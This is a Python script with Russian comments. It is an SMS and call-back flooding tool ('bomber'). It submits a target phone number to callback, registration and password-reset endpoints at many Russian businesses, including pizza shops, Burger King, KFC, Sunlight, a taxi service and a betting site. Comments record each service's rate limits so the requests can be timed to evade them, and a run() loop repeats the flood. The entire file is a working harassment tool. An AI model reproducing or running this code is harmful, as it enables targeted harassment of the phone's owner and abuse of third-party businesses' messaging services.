from time import sleep
from random import randint
import requests


def pizzalarenzo(phone):
    headers = {
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': '8'+phone,
        'time': ('%D0%91%D0%BB%D0%B8%D0%B6%D0%B0%D0%B9%D1%88%D0%B5%D0%B5+'
                 '%D0%B2%D1%80%D0%B5%D0%BC%D1%8F')
    }
    response_pizzalarenzo = requests.post(url='https://pizzalarenzo.ru/api/callback.php',
                                          headers=headers)
    print(response_pizzalarenzo, response_pizzalarenzo.content)

def tarelochka(phone):
    headers = {
        'url': 'tarelochcka-2016%40yandex.ru',
        'name_1': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone_1': '8'+phone

    }
    response_tarelochka = requests.post(url='https://xn--80achdsmuvm0h.xn--p1ai/send/send_1.php',
                                        headers=headers)
    print(response_tarelochka, response_tarelochka.content)

def pizzapan(phone):
    headers = {
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'mytel': '8'+phone

    }
    response_pizzapan = requests.post(url='http://pizzapan.ru/send2.php',
                                      headers=headers)
    print(response_pizzapan, response_pizzapan.content)


def dostaevsky(phone):
    dstvskphn = '+7 ' + phone[:3] + ' ' + phone[3:6] + '-' + phone[6:8] + '-' + phone[8:10]
    headers = {
        'phone': dstvskphn
    }
    response_dostaevsky = requests.post(url='https://msk.dostaevsky.ru/ajax/feedback/back_call.php',
                                        headers=headers)
    print(response_dostaevsky, response_dostaevsky.content)


def pizzasushiwok(phone):
    headers = {
        'mod_name': 'call_me',
        'task': 'request_call',
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': '8'+phone
    }
    response_pizzasushiwok = requests.post(url='https://pizzasushiwok.ru/', headers=headers)
    print(response_pizzasushiwok, response_pizzasushiwok.content)


def ipizza(phone):
    ipzzphn = '%2B7' + '+' + '(' + phone[:3] + ')' + '+' + phone[3:6] + '-' + phone[6:8] + '-'\
              + phone[8:10]
    headers = {
        'name': '%D0%92%D0%B0%D1%81%D0%B8%D0%BB%D0%B8%D0%B9',
        'phone': ipzzphn
    }
    response_ipizza = requests.post(url='https://ipizza.ru/xml/api/callback/', headers=headers)
    print(response_ipizza, response_ipizza.content)


def okeansushi(phone):
    oknsshphn = '8' + '+' + '(' + phone[:3] + ')' + '+' + phone[3:6] + '-' + phone[6:8] +\
                '-' + phone[8:10]
    response_okeansushi = requests.post(url=('https://okeansushi.ru/includes/contact.php?call_mail'
                                             '=1&ajax=1&name=%D0%93%D0%BE%D1%80%D0%B8%D0%B3%D0%BE%D'
                                             '1%80%D0%B8%D0%B5%D0%B9&phone=' + oknsshphn +
                                             '&call_time=1&call_time_dt%5B%5D=21&call_time_dt%5B%5D'
                                             '=45&pravila2=on'))
    print(response_okeansushi, response_okeansushi.content)


def sunlight(phone):
    snlghtphn = '7'+phone
    response_sunlight = requests.post(url='https://api.sunlight.net/v3/customers/authorization/',
                                      json={"phone": snlghtphn})
    print(response_sunlight, response_sunlight.content)


# тут если слать чаще чем раз примерно в минуту - ту мэни реквестс, надо таймер на минуту ставить
def bk(phone):
    bkphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
            '-' + phone[8:10]
    response_bk = requests.post(url='https://deliverysmart.burgerking.ru/account/session',
                                json={"phone": bkphn,
                                      "g-recaptcha-response": "null"})
    print(response_bk, response_bk.content)

# ваще хз, надо тестить, но должно работать, сначала регает, потом ресторит пароль раз в 3 минуты
def olimpbet(phone):
    olmpphn = '7'+phone
    response_olimpbet = requests.post(url='https://www.olimp.bet/api/smsregistration',
                                      json={"lang_id": "0", "platforma": "SITE_CUPIS",
                                            "cash": "3", "telnum": olmpphn,
                                            "email": "username0002@gmail.com",
                                            "tag": "c4bee55d6bb50e85287bffe8fd0113d5"})
    print(response_olimpbet)

    # вот ниже реквест с таймаутом в 3 минуты
    response_olimpbet = requests.post(url='https://www.olimp.bet/api/user/passrestore/',
                                      json={"lang_id": "0", "platforma": "SITE_CUPIS",
                                            "kind": "phone", "data": olmpphn})
    print(response_olimpbet, response_olimpbet.content)

#  тут какой-то таймаут, надо тестить, мне лень сейчас сидеть и засекать, вроде минута,
#  но оно как-то хз работает
def kfc(phone):
    kfcphn = '+7'+phone
    response_kfc = requests.post(url=('https://app-api.kfc.ru/api/v1/'
                                      'common/auth/send-validation-sms'),
                                 json={"phone": kfcphn})
    print(response_kfc.content)

#  ваще без таймаута походу
def taxinonstop(phone):
    txnnstpphn = '8'+phone
    response_taxinonstop = requests.post(url='https://taxinonstop.ru/dist/backend/register.php',
                                         json={"cmd": "register", "phone": txnnstpphn,
                                               "taxi_city": "tmn"})
    print(response_taxinonstop, response_taxinonstop.content)


def karusel(phone):
    krslphn = '7'+phone
    response_karusel = requests.post(url='https://app.karusel.ru/api/v1/phone/',
                                     json={"phone": krslphn})
    print(response_karusel, response_karusel.content)


def generate_email():
    """
    Generate e-mail
    :return: string email
    """
    services = ['gmail.com', 'yandex.ru', 'outlook.com']
    name_length = randint(6, 12)
    name = ''
    for i in range(name_length):
        name += chr(randint(97, 122))

    return name + '@' + services[randint(0, len(services) - 1)]


#  pizzalarenzo(phone)
#  tarelochka(phone)
#  pizzapan(phone)
#  dostaevsky(phone)
#  pizzasushiwok(phone)
#  ipizza(phone)
#  sunlight(phone)
#  bk(phone)
#  olimpbet(phone)
#  kfc(phone)
#  taxinonstop(phone)
#  test commit

# def run(phone):
#     print(phone)
#     pizzalarenzo(phone)
#     tarelochka(phone)
#     pizzapan(phone)
#     dostaevsky(phone)
#     pizzasushiwok(phone)
#     ipizza(phone)

#     for i in range(5):
#         sunlight(phone)
#         bk(phone)
#         # olimpbet(phone)
#         kfc(phone)
#         taxinonstop(phone)
#         sleep(180)

def run(phone, n):
    for i in range(n):
        kfc(phone)
        for j in range(3):
            bk(phone)
            for k in range(12):
                sunlight(phone)
                taxinonstop(phone)
                sleep(5)
